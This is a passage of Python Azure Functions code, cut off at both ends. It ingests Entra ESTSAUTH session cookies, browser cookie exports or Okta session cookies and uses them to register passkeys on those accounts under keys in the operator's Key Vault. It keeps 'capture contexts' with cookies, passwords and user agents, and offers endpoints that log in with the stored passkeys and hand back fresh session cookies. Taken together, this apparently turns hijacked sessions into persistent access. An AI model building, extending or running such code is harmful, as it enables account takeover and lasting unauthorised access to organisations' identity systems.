    direct_cookie = _get_request_value(body, req, "estsAuth", "estsAuthCookie")
    if direct_cookie:
        parsed_direct_cookie = extract_ests_auth_cookie_value(direct_cookie)
        if parsed_direct_cookie:
            return parsed_direct_cookie

    cookie_source = _get_body_value(body, *_COOKIE_EXPORT_FIELDS)
    if cookie_source is not None:
        parsed_cookie = extract_ests_auth_cookie_value(cookie_source)
        if parsed_cookie:
            return parsed_cookie

    cookie_query_value = _get_request_value(body, req, *_COOKIE_EXPORT_FIELDS)
    if cookie_query_value:
        return extract_ests_auth_cookie_value(cookie_query_value)

    return None


def _build_registration_queue_message(
    *,
    user_principal_name: str,
    ests_auth_cookie: str,
    display_name: str,
    key_vault_key_name: str | None,
    user_agent: str,
    redirect_uri: str,
) -> dict[str, object]:
    return {
        "requestId": str(uuid.uuid4()),
        "queuedAtUtc": _utc_timestamp(),
        "authMethod": "estsauth",
        "userPrincipalName": user_principal_name,
        "displayName": display_name,
        "keyVaultKeyName": key_vault_key_name,
        "estsAuth": ests_auth_cookie,
        "userAgent": normalize_user_agent(user_agent),
        "redirectUri": normalize_redirect_uri(redirect_uri),
    }


def _process_registration_queue_message(message_payload: dict[str, object]) -> dict[str, object]:
    capture_reference = message_payload.get("captureContext")
    if not isinstance(capture_reference, dict):
        raise PasskeyValidationError("Queue message is missing encrypted capture context.")
    captured_payload = _decrypt_capture(capture_reference)
    user_principal_name = str(message_payload.get("userPrincipalName") or "").strip()
    ests_auth_cookie = str(captured_payload.get("estsAuth") or captured_payload.get("estsAuthCookie") or "").strip()
    display_name = str(message_payload.get("displayName") or message_payload.get("passkeyDisplayName") or "").strip()
    key_vault_key_name = str(message_payload.get("keyVaultKeyName") or "").strip() or None
    user_agent = normalize_user_agent(message_payload.get("userAgent") or message_payload.get("useragent"))
    redirect_uri = normalize_redirect_uri(os.getenv("PASSKEY_ENTRA_PORTAL_ORIGIN", "https://mysignins.microsoft.com"))

    if not user_principal_name:
        raise PasskeyValidationError("Queue message is missing 'userPrincipalName'.")
    if not ests_auth_cookie:
        raise PasskeyValidationError("Queue message is missing 'estsAuth'.")

    config = load_config_from_environment()
    credential = register_passkey_via_ests_auth(
        config=config,
        requested_user_principal_name=user_principal_name,
        ests_auth_cookie=ests_auth_cookie,
        display_name=display_name or build_display_name(),
        key_vault_key_name=key_vault_key_name,
        user_agent=user_agent,
        redirect_uri=redirect_uri,
    )
    extensions = _persist_capture_context("entra", captured_payload, credential, user_agent)
    catalog_record = _save_catalog_record("entra", credential, extensions)
    return {
        "requestId": str(message_payload.get("requestId") or ""),
        "userPrincipalName": user_principal_name,
        "keyVaultName": config.key_vault_name,
        "credential": credential,
        "catalogRecord": catalog_record,
    }


def _build_okta_queue_message(*, body: dict[str, object], req: func.HttpRequest) -> dict[str, object]:
    cookie_header = _get_request_value(body, req, "cookieHeader", "cookie")
    state_handle = _get_request_value(body, req, "stateHandle")
    authenticator_id = _get_request_value(body, req, "authenticatorId")
    if not cookie_header or not state_handle or not authenticator_id:
        raise PasskeyValidationError("Okta queue requests require cookieHeader, stateHandle, and authenticatorId.")
    transport = _get_request_value(body, req, "transport") or "usb"
    if transport not in {"usb", "internal"}:
        raise PasskeyValidationError("transport must be 'usb' or 'internal'.")
    return {
        "requestId": str(uuid.uuid4()),
        "queuedAtUtc": _utc_timestamp(),
        "provider": "okta",
        "authMethod": "idx",
        "oktaDomain": _resolve_okta_domain(body, req),
        "cookieHeader": cookie_header,
        "stateHandle": state_handle,
        "authenticatorId": authenticator_id,
        "keyVaultKeyName": _get_request_value(body, req, "keyVaultKeyName"),
        "transport": transport,
    }


def _process_okta_queue_message(message_payload: dict[str, object]) -> dict[str, object]:
    config = load_config_from_environment()
    capture_reference = message_payload.get("captureContext")
    if not isinstance(capture_reference, dict):
        raise PasskeyValidationError("Queue message is missing encrypted capture context.")
    captured_payload = _decrypt_capture(capture_reference)
    credential = register_okta_idx_session(
        config=config,
        okta_domain=os.getenv("PASSKEY_OKTA_DOMAIN", "").strip(),
        cookie_header=str(captured_payload.get("cookieHeader") or captured_payload.get("cookie") or ""),
        state_handle=str(captured_payload.get("stateHandle") or ""),
        authenticator_id=str(captured_payload.get("authenticatorId") or ""),
        key_vault_key_name=str(message_payload.get("keyVaultKeyName") or "") or None,
        transport=str(message_payload.get("transport") or "usb"),
    )
    extensions = _persist_capture_context("okta", captured_payload, credential, normalize_user_agent(captured_payload.get("user_agent") or captured_payload.get("userAgent")))
    catalog_record = _save_catalog_record("okta", credential, extensions)
    return {
        "requestId": str(message_payload.get("requestId") or ""),
        "credential": credential,
        "catalogRecord": catalog_record,
    }


def _get_credential_payload(body: dict[str, object]) -> dict[str, object]:
    credential = body.get("credential")
    if isinstance(credential, dict):
        return dict(credential)

    return {
        key: value
        for key, value in body.items()
        if key not in {
            "credential", "authUrl", "keyVaultName", "keyVaultKeyName", "keyVaultAccessToken",
            "userAgent", "useragent", "redirectUri", "redirecturi", "oktaDomain", "domain",
            "accessToken", "oktaAccessToken", "cookieHeader", "cookie", "stateHandle",
            "authenticatorId", "challenge", "transport", "password", "clientId", "signCount",
        }
    }


def _apply_configured_key_vault(credential: dict[str, object], configured_vault_name: str) -> dict[str, object]:
    if not configured_vault_name:
        raise PasskeyValidationError("Missing required server setting 'PASSKEY_KEYVAULT_NAME'.")
    key_vault = dict(credential.get("keyVault")) if isinstance(credential.get("keyVault"), dict) else {}
    key_vault["vaultName"] = configured_vault_name
    key_id = str(key_vault.get("keyId") or "")
    if key_id and not key_id.startswith(f"https://{configured_vault_name}.vault.azure.net/keys/"):
        key_vault.pop("keyId", None)
    credential["keyVault"] = key_vault
    return credential


@app.function_name(name="ListPasskeyCatalogRecords")
@app.route(route="passkeys", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def list_passkey_catalog_records_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        provider = _get_request_value({}, req, "provider")
        if provider and provider not in {"entra", "okta"}:
            raise PasskeyValidationError("provider must be 'entra' or 'okta'.")
        status = _get_request_value({}, req, "status")
        if status and status not in {"active", "disabled", "deleted"}:
            raise PasskeyValidationError("status must be 'active', 'disabled', or 'deleted'.")
        records = _list_catalog_records(
            provider=provider,
            rp_id=_get_request_value({}, req, "rpId", "relyingParty"),
            user_name=_get_request_value({}, req, "userName", "username", "email"),
            status=status,
            credential_id=_get_request_value({}, req, "credentialId"),
            display_name=_get_request_value({}, req, "displayName"),
            key_vault_key_name=_get_request_value({}, req, "keyVaultKeyName", "keyName"),
        )
        return _json_response(200, {"success": True, "count": len(records), "records": records})
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="GetPasskeyCatalogRecord")
@app.route(route="passkeys/{recordId}", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def get_passkey_catalog_record_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        record_id = req.route_params.get("recordId") or req.params.get("recordId")
        if not record_id:
            raise PasskeyValidationError("Missing required route or query value 'recordId'.")
        record = _get_catalog_record(record_id)
        if record is None:
            return _json_response(404, {"success": False, "recordId": record_id, "error": "Passkey was not found."})
        return _json_response(200, {"success": True, "record": record})
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(500, {"success": False, "error": str(exc)})


def _get_provider_passkeys_response(req: func.HttpRequest, provider: str) -> func.HttpResponse:
    try:
        record_id = req.route_params.get("recordId") or req.params.get("recordId")
        if record_id:
            record = _get_catalog_record(record_id)
            if record is None or record.get("provider") != provider:
                return _json_response(
                    404,
                    {"success": False, "provider": provider, "recordId": record_id, "error": "Passkey was not found."},
                )
            return _json_response(200, {"success": True, "provider": provider, "record": record})

        status = _get_request_value({}, req, "status")
        if status and status not in {"active", "disabled", "deleted"}:
            raise PasskeyValidationError("status must be 'active', 'disabled', or 'deleted'.")
        records = _list_catalog_records(
            provider=provider,
            rp_id=_get_request_value({}, req, "rpId", "relyingParty"),
            user_name=_get_request_value({}, req, "userName", "username", "email"),
            status=status,
            credential_id=_get_request_value({}, req, "credentialId"),
            display_name=_get_request_value({}, req, "displayName"),
            key_vault_key_name=_get_request_value({}, req, "keyVaultKeyName", "keyName"),
        )
        return _json_response(
            200,
            {"success": True, "provider": provider, "count": len(records), "records": records},
        )
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "provider": provider, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(500, {"success": False, "provider": provider, "error": str(exc)})


@app.function_name(name="GetEntraPasskeys")
@app.route(route="entra/passkeys/{recordId?}", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def get_entra_passkeys_http(req: func.HttpRequest) -> func.HttpResponse:
    return _get_provider_passkeys_response(req, "entra")


@app.function_name(name="GetOktaPasskeys")
@app.route(route="okta/passkeys/{recordId?}", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def get_okta_passkeys_http(req: func.HttpRequest) -> func.HttpResponse:
    return _get_provider_passkeys_response(req, "okta")


@app.function_name(name="ListPasskeyCaptureContexts")
@app.route(route="passkeys/{recordId}/contexts", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def list_passkey_capture_contexts_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        record_id = str(req.route_params.get("recordId") or "")
        if not _get_catalog_record(record_id):
            return _json_response(404, {"success": False, "error": "Passkey was not found."})
        contexts = _list_capture_contexts(record_id)
        return _json_response(200, {"success": True, "recordId": record_id, "count": len(contexts), "contexts": contexts})
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="GetPasskeyCaptureContext")
@app.route(route="passkeys/{recordId}/contexts/{captureId}", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def get_passkey_capture_context_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        record_id = str(req.route_params.get("recordId") or "")
        capture_id = str(req.route_params.get("captureId") or "")
        context = _get_capture_context(record_id, capture_id)
        if not context:
            return _json_response(404, {"success": False, "error": "Capture context was not found."})
        return _json_response(200, {"success": True, "context": context})
    except Exception as exc:  # noqa: BLE001
        return _json_response(500, {"success": False, "error": str(exc)})


def _no_store_response(status_code: int, payload: dict[str, object]) -> func.HttpResponse:
    return func.HttpResponse(
        json.dumps(payload, separators=(",", ":")),
        status_code=status_code,
        mimetype="application/json",
        headers={"Cache-Control": "no-store", "Pragma": "no-cache"},
    )


@app.function_name(name="ExportPasskeyLoginContext")
@app.route(route="passkeys/{recordId}/login-context/export", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def export_passkey_login_context_http(req: func.HttpRequest) -> func.HttpResponse:
    if not _development_export_enabled():
        return _no_store_response(403, {"success": False, "error": "Development secret export is disabled."})
    try:
        record = _get_catalog_record(str(req.route_params.get("recordId") or ""))
        if not record:
            return _no_store_response(404, {"success": False, "error": "Passkey was not found."})
        context = _load_login_context(record)
        if not context:
            return _no_store_response(404, {"success": False, "error": "Login context was not found."})
        logging.warning("Development login-context export for recordId=%s", record.get("recordId"))
        return _no_store_response(200, {"success": True, "recordId": record.get("recordId"), "loginContext": context})
    except Exception as exc:  # noqa: BLE001
        return _no_store_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="DeletePasskeyLoginContext")
@app.route(route="passkeys/{recordId}/login-context", methods=["DELETE"], auth_level=func.AuthLevel.FUNCTION)
def delete_passkey_login_context_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        record = _get_catalog_record(str(req.route_params.get("recordId") or ""))
        if not record:
            return _json_response(404, {"success": False, "error": "Passkey was not found."})
        secret_name = str(record.get("loginContextSecretName") or "")
        deleted = bool(secret_name and _delete_key_vault_secret(load_config_from_environment(), secret_name))
        credential = dict(record)
        credential["relyingParty"] = record.get("rpId")
        credential[str(record.get("provider"))] = record.get("providerMetadata") or {}
        extensions = {"loginContextSecretName": None, "hasStoredPassword": False, "hasStoredUserAgent": False}
        if record.get("latestCaptureId"):
            extensions["latestCaptureId"] = record["latestCaptureId"]
        _save_catalog_record(str(record.get("provider")), credential, extensions)
        logging.warning("Login context deletion recordId=%s deleted=%s", record.get("recordId"), deleted)
        return _json_response(200, {"success": True, "recordId": record.get("recordId"), "deleted": deleted})
    except Exception as exc:  # noqa: BLE001
        return _json_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="ExportPasskeyCaptureContext")
@app.route(route="passkeys/{recordId}/contexts/{captureId}/export", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def export_passkey_capture_context_http(req: func.HttpRequest) -> func.HttpResponse:
    if not _development_export_enabled():
        return _no_store_response(403, {"success": False, "error": "Development secret export is disabled."})
    try:
        record_id = str(req.route_params.get("recordId") or "")
        capture_id = str(req.route_params.get("captureId") or "")
        context = _get_capture_context(record_id, capture_id)
        if not context:
            return _no_store_response(404, {"success": False, "error": "Capture context was not found."})
        payload = _decrypt_capture(context)
        logging.warning("Development capture export for recordId=%s captureId=%s", record_id, capture_id)
        return _no_store_response(200, {"success": True, "recordId": record_id, "captureId": capture_id, "capture": payload})
    except TimeoutError:
        return _no_store_response(410, {"success": False, "error": "Capture context has expired."})
    except Exception as exc:  # noqa: BLE001
        return _no_store_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="LoginWithStoredEntraPasskey")
@app.route(route="entra/passkeys/{recordId}/login", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def login_with_stored_entra_passkey_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        record = _get_catalog_record(str(req.route_params.get("recordId") or ""))
        if not record or record.get("provider") != "entra":
            return _json_response(404, {"success": False, "error": "Entra passkey was not found."})
        login_context = _load_login_context(record)
        user_agent = normalize_user_agent(str(login_context.get("userAgent") or ""))
        config = load_config_from_environment()
        result = authenticate_with_passkey(
            credential=_apply_configured_key_vault(dict(record), config.key_vault_name),
            key_vault_access_token=config.key_vault_access_token,
            key_vault_managed_identity_client_id=config.managed_identity_client_id,
            key_vault_tenant_id=config.tenant_id,
            user_agent=user_agent,
            **({"auth_url": os.getenv("PASSKEY_ENTRA_AUTH_URL", "").strip()} if os.getenv("PASSKEY_ENTRA_AUTH_URL", "").strip() else {}),
        )
        return _json_response(200 if result.success else 401, {"success": result.success, "provider": "entra", "recordId": record.get("recordId"), "userPrincipalName": result.user_principal_name, "estsAuth": result.cookie_value})
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="LoginWithStoredOktaPasskey")
@app.route(route="okta/passkeys/{recordId}/login", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def login_with_stored_okta_passkey_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        record = _get_catalog_record(str(req.route_params.get("recordId") or ""))
        if not record or record.get("provider") != "okta":
            return _json_response(404, {"success": False, "error": "Okta passkey was not found."})
        login_context = _load_login_context(record)
        config = load_config_from_environment()
        result = login_okta_passkey(
            config=config,
            okta_domain=os.getenv("PASSKEY_OKTA_DOMAIN", "").strip(),
            user_name=str(record.get("userName") or ""),
            credential=_apply_configured_key_vault(dict(record), config.key_vault_name),
            key_vault_access_token=config.key_vault_access_token,
            password=str(login_context.get("password") or "") or None,
            redirect_uri=os.getenv("PASSKEY_OKTA_REDIRECT_URI", "").strip() or None,
            user_agent=normalize_user_agent(str(login_context.get("userAgent") or "")),
        )
        return _json_response(200, {"provider": "okta", "recordId": record.get("recordId"), **result})
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(502, {"success": False, "error": str(exc)})


@app.function_name(name="RegisterEntraPasskeyViaTap")
@app.route(route="entra/passkeys/register/tap", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def register_entra_passkey_via_tap_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        config = load_config_from_environment()
        body = _get_request_body(req)
        user_principal_name = _get_request_value(body, req, "userPrincipalName", "username", "email")
        tap = _get_request_value(body, req, "tap", "temporaryAccessPass")
        display_name = _get_request_value(body, req, "displayName") or build_display_name()
        key_vault_key_name = _get_request_value(body, req, "keyVaultKeyName")
        user_agent = _resolve_user_agent(body, req)
        redirect_uri = _resolve_redirect_uri(body, req)

        credential = register_passkey_via_tap(
            config=config,
            user_principal_name=user_principal_name or "",
            tap=tap or "",
            display_name=display_name,
            key_vault_key_name=key_vault_key_name,
            user_agent=user_agent,
            redirect_uri=redirect_uri,
        )
        capture_extensions = _persist_capture_context("entra", body, credential, user_agent)
        catalog_record = _save_catalog_record("entra", credential, capture_extensions)
        return _json_response(
            200,
            {
                "success": True,
                "authMethod": "tap",
                "tenantId": config.tenant_id,
                "keyVaultName": config.key_vault_name,
                "credential": credential,
                "catalogRecord": catalog_record,
                "loginPropagation": _build_login_propagation_hint(),
            },
        )
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except PasskeySecurityError as exc:
        logger.exception("RegisterEntraPasskeyViaTap security failure")
        return _json_response(500, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        logger.exception("RegisterEntraPasskeyViaTap failed")
        return _json_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="RegisterEntraPasskeyViaEstsAuth")
@app.route(route="entra/passkeys/register/estsauth", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def register_entra_passkey_via_ests_auth_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        config = load_config_from_environment()
        body = _get_request_body(req)
        user_principal_name = _get_request_value(body, req, "userPrincipalName", "username", "email")
        ests_auth = _resolve_ests_auth_value(body, req)
        display_name = _get_request_value(body, req, "displayName", "passkeyDisplayName") or build_display_name()
        key_vault_key_name = _get_request_value(body, req, "keyVaultKeyName")
        user_agent = _resolve_user_agent(body, req)
        redirect_uri = _resolve_redirect_uri(body, req)

        credential = register_passkey_via_ests_auth(
            config=config,
            requested_user_principal_name=user_principal_name or "",
            ests_auth_cookie=ests_auth or "",
            display_name=display_name,
            key_vault_key_name=key_vault_key_name,
            user_agent=user_agent,
            redirect_uri=redirect_uri,
        )
        capture_extensions = _persist_capture_context("entra", body, credential, user_agent)
        catalog_record = _save_catalog_record("entra", credential, capture_extensions)
        return _json_response(
            200,
            {
                "success": True,
                "authMethod": "estsauth",
                "tenantId": config.tenant_id,
                "keyVaultName": config.key_vault_name,
                "credential": credential,
                "catalogRecord": catalog_record,
                "loginPropagation": _build_login_propagation_hint(),
            },
        )
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except PasskeySecurityError as exc:
        logger.exception("RegisterEntraPasskeyViaEstsAuth security failure")
        return _json_response(500, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        logger.exception("RegisterEntraPasskeyViaEstsAuth failed")
        return _json_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="QueueEntraPasskeyRegistrationViaEstsAuth")
@app.route(route="entra/passkeys/register/estsauth/queue", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
@app.queue_output(arg_name="registration_message", queue_name="%PASSKEY_REGISTRATION_QUEUE_NAME%", connection="AzureWebJobsStorage")
def queue_entra_passkey_registration_via_ests_auth_http(
    req: func.HttpRequest,
    registration_message: func.Out[str],
) -> func.HttpResponse:
    try:
        body = _get_request_body(req)
        user_principal_name = _get_request_value(body, req, "userPrincipalName", "username", "email")
        if not user_principal_name:
            raise PasskeyValidationError("Missing required field 'userPrincipalName', 'username', or 'email'.")

        ests_auth = _resolve_ests_auth_value(body, req)
        if not ests_auth:
            raise PasskeyValidationError(
                "Missing required field 'estsAuth', 'estsAuthCookie', or a cookie export containing ESTSAUTH."
            )

        display_name = _get_request_value(body, req, "displayName", "passkeyDisplayName") or build_display_name()
        key_vault_key_name = _get_request_value(body, req, "keyVaultKeyName")
        user_agent = _resolve_user_agent(body, req)
        redirect_uri = _resolve_redirect_uri(body, req)
        queue_message = _build_registration_queue_message(
            user_principal_name=user_principal_name,
            ests_auth_cookie=ests_auth,
            display_name=display_name,
            key_vault_key_name=key_vault_key_name,
            user_agent=user_agent,
            redirect_uri=redirect_uri,
        )
        queue_message["captureContext"] = _stage_queued_capture("entra", body, str(queue_message["requestId"]))
        queue_message.pop("estsAuth", None)
        _write_registration_status(
            str(queue_message["requestId"]),
            {
                "requestId": queue_message["requestId"],
                "status": "queued",
                "authMethod": "estsauth",
                "queueName": os.getenv("PASSKEY_REGISTRATION_QUEUE_NAME", "passkey-registration"),
                "userPrincipalName": user_principal_name,
                "displayName": display_name,
                "keyVaultKeyName": key_vault_key_name,
                "queuedAtUtc": queue_message["queuedAtUtc"],
                "userAgent": user_agent,
                "redirectUri": redirect_uri,
            },
        )
        registration_message.set(json.dumps(queue_message, separators=(",", ":")))

        return _json_response(
            202,
            {
                "success": True,
                "queued": True,
                "authMethod": "estsauth",
                "requestId": queue_message["requestId"],
                "queueName": os.getenv("PASSKEY_REGISTRATION_QUEUE_NAME", "passkey-registration"),
                "userPrincipalName": user_principal_name,
                "statusUrl": _build_status_url(req, str(queue_message["requestId"])),
                "loginPropagation": _build_login_propagation_hint(),
            },
        )
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except PasskeySecurityError as exc:
        logger.exception("QueueEntraPasskeyRegistrationViaEstsAuth security failure")
        return _json_response(500, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        logger.exception("QueueEntraPasskeyRegistrationViaEstsAuth failed")
        return _json_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="ProcessEntraPasskeyRegistrationViaEstsAuth")
@app.queue_trigger(arg_name="registration_message", queue_name="%PASSKEY_REGISTRATION_QUEUE_NAME%", connection="AzureWebJobsStorage")
def process_entra_passkey_registration_via_ests_auth_queue(registration_message: func.QueueMessage) -> None:
    payload = json.loads(registration_message.get_body().decode("utf-8"))
    request_id = str(payload.get("requestId") or "")
    processing_started_at_utc = _utc_timestamp()
    _write_registration_status(
        request_id,
        {
            "requestId": request_id,
            "status": "processing",
            "authMethod": "estsauth",
            "queueName": os.getenv("PASSKEY_REGISTRATION_QUEUE_NAME", "passkey-registration"),
            "userPrincipalName": str(payload.get("userPrincipalName") or ""),
            "displayName": str(payload.get("displayName") or payload.get("passkeyDisplayName") or ""),
            "keyVaultKeyName": str(payload.get("keyVaultKeyName") or ""),
            "queuedAtUtc": str(payload.get("queuedAtUtc") or ""),
            "processingStartedAtUtc": processing_started_at_utc,
            "userAgent": normalize_user_agent(payload.get("userAgent") or payload.get("useragent")),
            "redirectUri": normalize_redirect_uri(payload.get("redirectUri") or payload.get("redirecturi")),
        },
    )
    try:
        result = _process_registration_queue_message(payload)
        credential = result["credential"]
        key_vault = credential.get("keyVault") if isinstance(credential, dict) else None
        key_name = key_vault.get("keyName") if isinstance(key_vault, dict) else None
        _write_registration_status(
            request_id,
            {
                "requestId": request_id,
                "status": "succeeded",
                "authMethod": "estsauth",
                "queueName": os.getenv("PASSKEY_REGISTRATION_QUEUE_NAME", "passkey-registration"),
                "userPrincipalName": result["userPrincipalName"],
                "keyVaultName": result["keyVaultName"],
                "keyVaultKeyName": str(payload.get("keyVaultKeyName") or ""),
                "displayName": str(payload.get("displayName") or payload.get("passkeyDisplayName") or ""),
                "queuedAtUtc": str(payload.get("queuedAtUtc") or ""),
                "processingStartedAtUtc": processing_started_at_utc,
                "completedAtUtc": _utc_timestamp(),
                "userAgent": normalize_user_agent(payload.get("userAgent") or payload.get("useragent")),
                "redirectUri": normalize_redirect_uri(payload.get("redirectUri") or payload.get("redirecturi")),
                "credential": credential,
                "catalogRecord": result["catalogRecord"],
            },
        )
        logging.info(
            "Processed ESTSAUTH passkey registration request %s for %s with key %s.",
            result["requestId"] or "<no-request-id>",
            result["userPrincipalName"],
            key_name or "<no-key-name>",
        )
    except Exception as exc:  # noqa: BLE001
        _write_registration_status(
            request_id,
            {
                "requestId": request_id,
                "status": "failed",
                "authMethod": "estsauth",
                "queueName": os.getenv("PASSKEY_REGISTRATION_QUEUE_NAME", "passkey-registration"),
                "userPrincipalName": str(payload.get("userPrincipalName") or ""),
                "keyVaultKeyName": str(payload.get("keyVaultKeyName") or ""),
                "displayName": str(payload.get("displayName") or payload.get("passkeyDisplayName") or ""),
                "queuedAtUtc": str(payload.get("queuedAtUtc") or ""),
                "processingStartedAtUtc": processing_started_at_utc,
                "failedAtUtc": _utc_timestamp(),
                "userAgent": normalize_user_agent(payload.get("userAgent") or payload.get("useragent")),
                "redirectUri": normalize_redirect_uri(payload.get("redirectUri") or payload.get("redirecturi")),
                "error": str(exc),
            },
        )
        raise


@app.function_name(name="GetEntraPasskeyRegistrationStatus")
@app.route(route="entra/passkeys/register/status/{requestId}", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def get_entra_passkey_registration_status_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        request_id = req.route_params.get("requestId") or req.params.get("requestId")
        if not request_id:
            raise PasskeyValidationError("Missing required route or query value 'requestId'.")

        status = _read_registration_status(request_id)
        if status is None:
            return _json_response(
                404,
                {
                    "success": False,
                    "requestId": request_id,
                    "error": "Registration request status was not found.",
                },
            )

        status["success"] = True
        return _json_response(200, status)
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="LoginWithEntraPasskey")
@app.route(route="entra/passkeys/login", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def login_with_entra_passkey_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        config = load_config_from_environment()
        body = _get_request_body(req)
        key_vault_key_name = _get_request_value(body, req, "keyVaultKeyName")
        user_agent = _resolve_user_agent(body, req)
        credential = _get_credential_payload(body)
        if not credential:
            raise PasskeyValidationError(
                "Request body must include a credential object or passkey login credential fields."
            )
        if key_vault_key_name:
            existing_key_vault = credential.get("keyVault")
            credential["keyVault"] = dict(existing_key_vault) if isinstance(existing_key_vault, dict) else {}
            credential["keyVault"]["keyName"] = key_vault_key_name
        credential = _apply_configured_key_vault(credential, config.key_vault_name)

        login_kwargs = {
            "credential": credential,
            "key_vault_access_token": config.key_vault_access_token,
            "key_vault_managed_identity_client_id": config.managed_identity_client_id,
            "key_vault_tenant_id": config.tenant_id,
            "user_agent": user_agent,
        }
        configured_auth_url = os.getenv("PASSKEY_ENTRA_AUTH_URL", "").strip()
        if configured_auth_url:
            login_kwargs["auth_url"] = configured_auth_url

        result = authenticate_with_passkey(**login_kwargs)
        return _json_response(
            200 if result.success else 401,
            {
                "success": result.success,
                "authMethod": "passkey",
                "userPrincipalName": result.user_principal_name,
                "signatureMethod": result.signature_method,
                "cookieType": result.cookie_type,
                "estsAuth": result.cookie_value,
                "estsAuthCookie": result.cookie_value,
                "keyVaultName": result.key_vault_name,
            },
        )
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "error": str(exc)})
    except PasskeySecurityError as exc:
        return _json_response(500, {"success": False, "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(500, {"success": False, "error": str(exc)})


@app.function_name(name="StartOktaMyAccountWebAuthnRegistration")
@app.route(route="okta/passkeys/register/myaccount", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def start_okta_myaccount_webauthn_registration_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        body = _get_request_body(req)
        result = start_myaccount_registration(
            okta_domain=_resolve_okta_domain(body, req),
            access_token=_resolve_okta_access_token(body, req),
        )
        return _json_response(200, {"success": True, "provider": "okta", "registration": result})
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "provider": "okta", "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(502, {"success": False, "provider": "okta", "error": str(exc)})


@app.function_name(name="RegisterOktaPasskeyViaIdxSession")
@app.route(route="okta/passkeys/register/idx", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def register_okta_passkey_via_idx_session_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        config = load_config_from_environment()
        body = _get_request_body(req)
        credential = register_okta_idx_session(
            config=config,
            okta_domain=_resolve_okta_domain(body, req),
            cookie_header=_get_request_value(body, req, "cookieHeader", "cookie") or "",
            state_handle=_get_request_value(body, req, "stateHandle") or "",
            authenticator_id=_get_request_value(body, req, "authenticatorId") or "",
            key_vault_name=config.key_vault_name,
            key_vault_key_name=_get_request_value(body, req, "keyVaultKeyName"),
            key_vault_access_token=config.key_vault_access_token,
            transport=_get_request_value(body, req, "transport") or "usb",
        )
        user_agent = _resolve_user_agent(body, req)
        capture_extensions = _persist_capture_context("okta", body, credential, user_agent)
        catalog_record = _save_catalog_record("okta", credential, capture_extensions)
        return _json_response(
            200,
            {
                "success": True,
                "provider": "okta",
                "authMethod": "idx",
                "credential": credential,
                "catalogRecord": catalog_record,
            },
        )
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "provider": "okta", "error": str(exc)})
    except OktaPasskeySecurityError as exc:
        return _json_response(502, {"success": False, "provider": "okta", "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(502, {"success": False, "provider": "okta", "error": str(exc)})


@app.function_name(name="QueueOktaPasskeyRegistrationViaIdxSession")
@app.route(route="okta/passkeys/register/idx/queue", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
